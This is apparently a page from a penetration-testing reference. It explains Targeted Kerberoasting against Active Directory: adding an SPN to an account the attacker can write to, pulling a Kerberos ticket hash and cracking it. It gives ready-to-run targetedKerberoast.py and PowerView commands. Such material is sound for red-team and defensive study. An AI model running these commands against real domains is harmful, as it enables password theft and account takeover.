This abuse can be carried out when controlling an object that has a `GenericAll, GenericWrite, WriteProperty or Validated-SPN` over the target. A member of the Account Operator group usually has those permissions.

The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting. This technique is called Targeted Kerberoasting.

=== "UNIX-like"
    From UNIX-like systems, this can be done with [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) (Python)
    ```bash
    targetedKerberoast.py -v -d "$DC_HOST" -u "$USER" -p "$PASSWORD"
    ```
=== "Windows"
    From Windows machines, this can be achieved with Set-DomainObject and Get-DomainSPNTicket (PowerView module).
    ```bash
    # Make sur that the target account has no SPN
    Get-DomainUser 'victimuser' | Select serviceprincipalname

    # Set the SPN
    Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

    # Obtain a kerberoast hash
    $User = Get-DomainUser 'victimuser'
    $User | Get-DomainSPNTicket | fl

    # Clear the SPNs of the target account
    $User | Select serviceprincipalname
    Set-DomainObject -Identity victimuser -Clear serviceprincipalname
    ```
Once the Kerberoast hash is obtained, it can possibly be cracked to recover the account's password if the password used is weak enough.